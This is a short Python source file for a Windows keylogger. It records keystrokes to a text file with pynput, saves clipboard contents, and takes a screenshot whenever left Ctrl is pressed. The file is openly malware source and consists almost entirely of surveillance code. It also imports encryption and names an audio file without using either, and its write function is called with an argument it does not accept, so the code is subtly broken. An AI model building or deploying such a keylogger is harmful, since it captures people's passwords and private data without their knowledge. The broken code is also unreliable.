from pynput.keyboard import Key, Listener
import win32clipboard
from PIL import ImageGrab
from cryptography.fernet import Fernet

keys = []
key_file = "keyInfo.txt"
clip_file = "clipboard.txt"
audio_file = "audio.wav"
screenshot_info = "screenshot.png"


def get_screen():
    image = ImageGrab.grab()
    image.save(screenshot_info)


def copy_clipboard():
    with open(clip_file, "a") as f:
        try:
            win32clipboard.OpenClipboard()
            data = win32clipboard.GetClipboardData()
            win32clipboard.CloseClipboard()
            f.write(data + "\n")
        except Exception:
            f.write("Clipping Failed")


def on_press(key):
    global keys
    print(key)

    if key == Key.ctrl_l:
        copy_clipboard()
        get_screen()

    if key == Key.backspace:
        keys.pop()
    elif (key == Key.space) or (key == Key.enter):
        write(keys)
        keys = []
    else:
        keys.append(key)


def write():
    with open(key_file, "a") as f:
        for k in keys:
            if k == Key.space:
                f.write("\n")
            if k == Key.backspace:
                print(k)
            else:
                f.write(str(k).replace("'", ""))


def on_release(key):
    if key == Key.esc:
        return False


with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()